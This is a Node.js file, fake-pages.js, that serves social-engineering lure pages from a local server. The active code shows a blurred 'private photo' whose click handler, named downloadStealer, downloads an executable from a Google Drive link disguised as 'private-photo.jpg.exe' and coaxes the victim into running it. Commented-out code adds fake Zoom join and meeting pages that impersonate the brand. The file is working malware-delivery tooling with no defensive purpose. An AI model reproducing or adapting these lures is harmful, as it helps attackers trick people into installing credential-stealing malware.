// fake-pages.js - Blurry Seductive Image Bait
const fs = require('fs');
const path = require('path');
const http = require('http');
const { exec } = require('child_process');

const PORT = 8080;

const FAKE_IMAGE_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Private Photo</title>
    <style>
        body {
            margin:0; padding:0; background:#0a0a0a; font-family: Arial, sans-serif;
            color:white; text-align:center;
        }
        .container { max-width: 520px; margin: 40px auto; }
        img {
            max-width: 100%; border-radius: 12px; cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,0,0,0.9);
        }
        h1 { margin: 20px 0 8px 0; font-size: 24px; }
        p { color: #ccc; margin-bottom: 30px; }
        .info { color: #ff4444; font-size: 14px; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo</h1>
        <p>Click image to view in full resolution</p>

        <!-- Blurry seductive image -->
        <img src="https://picsum.photos/id/1027/800/600/?blur=10"
             alt="Blurred Private Photo"
             onclick="downloadStealer()">

        <p class="info">
            Your browser may block the file.<br>
            After download, click "Keep" then double-click the file to view the full photo.
        </p>
    </div>

    <script>
        function downloadStealer() {
            const link = document.createElement('a');
            link.href = "https://drive.google.com/uc?export=download&id=1_V_XVAA6FeUaIwlILRjXat8OVIDyRJxh";     // ← Change this
            link.download = "private-photo.jpg.exe";       // Disguised as image
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
`;

async function showFakeImageBait() {
    console.log("[+] Opening Captivating Blurry Photo Bait...");

    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(FAKE_IMAGE_HTML);
    });

    server.listen(PORT, '127.0.0.1', () => {
        console.log("[+] Server running at http://127.0.0.1:" + PORT);
        exec('start http://127.0.0.1:' + PORT, (err) => {
            if (err) console.error("[-] Failed to open browser:", err.message);
        });
    });
}

module.exports = { showFakeImageBait };


/**
// fake-pages.js
const http = require('http');
const { exec } = require('child_process');

const PORT = 8080;

const FAKE_ZOOM_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Join Meeting | Zoom</title>

    <style>
        body {
            margin:0;
            padding:0;
            background:white;
            font-family:-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, "sans-serif";
        }

        .topbar {
            background:white;
            padding:10px 20px;
            display:flex;
            justify-content:space-between;
            align-items:center;
            border-bottom:1px solid #ddd;
        }

        .logo {
            font-size:40px;
            font-weight:bold;
            color:#0e71eb;
        }

        .topbar-right {
            display:flex;
            gap:10px;
            align-items:center;
        }

        .topbar button {
            padding:8px 16px;
            border-radius:20px;
            font-size:14px;
            cursor:pointer;
        }

        .support {
            background:white;
            border:1px solid #0e71eb;
            color:#0e71eb;
        }

        .signup {
            background:#0e71eb;
            color:white;
            border:none;
        }

        .main {
            max-width:420px;
            margin:60px auto;
            background:white;
            border-radius:12px;
            box-shadow:0 4px 20px rgba(0,0,0,0.1);
            padding:40px 30px;
        }

        h1 {
            text-align:center;
            font-size:28px;
            margin:0 0 20px 0;
        }

        label {
            display:block;
            margin-bottom:8px;
            color:#555;
            font-size:15px;
        }

        input {
            width:100%;
            padding:14px;
            border:1px solid #ccc;
            border-radius:8px;
            font-size:16px;
            box-sizing:border-box;
            margin-bottom:20px;
        }

        .agreement {
            text-align:center;
            font-size:13px;
            color:#666;
            margin-bottom:20px;
        }

        .main button {
            width:100%;
            padding:16px;
            background:#0e71eb;
            color:white;
            border:none;
            border-radius:8px;
            font-size:17px;
            font-weight:bold;
            cursor:pointer;
        }

        .main button:hover {
            background:#0b5cc4;
        }

        .sip-link {
            text-align:center;
            margin-top:25px;
            color:#0e71eb;
            font-size:14px;
        }

        .footer {
            text-align:center;
            margin-top:40px;
            color:#888;
            font-size:12px;
        }
    </style>
</head>

<body>

    <div class="topbar">
        <div class="logo">zoom</div>

        <div class="topbar-right">
            <button class="support">Support</button>
            <button class="signup">Sign Up Free</button>
        </div>
    </div>

    <div class="main">
        <h1>Join Meeting</h1>

        <label>Meeting ID or Personal Link Name</label>

        <input type="text" value="1344556" readonly>

        <div class="agreement">
            By clicking "Join", you agree to our
            <a href="#">Terms of Services</a>
            and
            <a href="#">Privacy Statement</a>
        </div>

        <button onclick="joinMeeting()">Join</button>

        <div class="sip-link">
            Join a meeting from an H.323/SIP room system
        </div>
    </div>

    <div class="footer">
        © 2026 Zoom Communications, Inc.
        All rights reserved.
        Privacy & Legal Policies
    </div>

    <script>
        function joinMeeting() {
            const btn = document.querySelector('.main button');

            btn.textContent = "Joining...";
            btn.style.background = "#666";

            setTimeout(() => {
                window.location.href = "https://zoom.us";
            }, 1500);
        }
    </script>

</body>
</html>
`;

async function showFakeZoomMeeting() {
    console.log("[+] Starting local HTTP server...");

    const server = http.createServer((req, res) => {
        res.writeHead(200, {
            'Content-Type': 'text/html'
        });

        res.end(FAKE_ZOOM_HTML);
    });

    server.listen(PORT, '127.0.0.1', () => {
        console.log("[+] Server running at http://127.0.0.1:" + PORT);

        exec('start http://127.0.0.1:' + PORT, (err) => {
            if (err) {
                console.error("[-] Failed to open browser:", err.message);
            }
        });
    });
}

module.exports = {
    showFakeZoomMeeting
};



// fake-pages.js — Realistic Zoom Meeting Page

const { exec } = require('child_process');
const http = require('http');

const realisticZoomHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zoom Meeting | Patrick's note - 03.21.2026</title>
    <style>
        body { margin:0; padding:0; background:#1a1a1a; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color:white; overflow:hidden; height:100vh; }
        .header { background:#2d2d2d; padding:10px 20px; display:flex; justify-content:space-between; align-items:center; font-size:15px; }
        .video-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap:10px; padding:20px; height:calc(100vh - 120px); }
        .participant { background:#000; border-radius:8px; position:relative; overflow:hidden; min-height:180px; display:flex; align-items:center; justify-content:center; }
        .participant img { width:100%; height:100%; object-fit:cover; }
        .name-tag { position:absolute; bottom:12px; left:12px; background:rgba(0,0,0,0.75); padding:4px 12px; border-radius:4px; font-size:13px; }
        .controls { position:fixed; bottom:0; left:0; right:0; background:#2d2d2d; padding:15px; display:flex; justify-content:center; gap:15px; }
        button { background:#3f3f3f; color:white; border:none; padding:12px 24px; border-radius:50px; cursor:pointer; font-size:14px; }
        .red { background:#e03e3e !important; }
        .loading { color:#0e71eb; font-size:18px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100% {opacity:0.6;} 50% {opacity:1;} }
    </style>
</head>
<body>
    <div class="header">
        <div>Patrick's note - 03.21.2026</div>
        <div>Zoom Meeting • 9 participants</div>
    </div>

    <div class="video-grid">
        <div class="participant"><div class="loading">Starting your video...</div><div class="name-tag">You (Host)</div></div>
        <div class="participant"><img src="https://i.imgur.com/8zY5z3K.jpeg" alt=""><div class="name-tag">Maurice Lawson</div></div>
        <div class="participant"><img src="https://i.imgur.com/4zX9kLm.jpeg" alt=""><div class="name-tag">Sarah Chen</div></div>
        <div class="participant"><div class="loading">Connecting...</div><div class="name-tag">John Okon</div></div>
    </div>

    <div class="controls">
        <button>🎤 Mute</button>
        <button>📹 Stop Video</button>
        <button onclick="leaveMeeting()" class="red">Leave Meeting</button>
        <button>💬 Chat</button>
        <button>👥 Participants</button>
    </div>

    <script>
    function leaveMeeting() {
        document.body.innerHTML = '<div style="text-align:center;margin-top:25%;font-size:22px;">Leaving meeting...<br><br>Thank you!</div>';
        setTimeout(() => window.location.href = "https://zoom.us", 2000);
    }

    setTimeout(() => {
        document.querySelectorAll('.loading').forEach(el => { if (el) el.style.display = 'none'; });
    }, 2800);
    </script>
</body>
</html>`;

module.exports.showFakeZoomMeeting = function showFakeZoomMeeting() {
    console.log("[+] Opening realistic fake Zoom meeting...");

    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(realisticZoomHTML);
    });

    server.listen(8080, '127.0.0.1', () => {
        exec('start http://127.0.0.1:8080', { windowsHide: true });
    });

    setTimeout(() => server.close(), 900000); // close after 15 min
};
*/
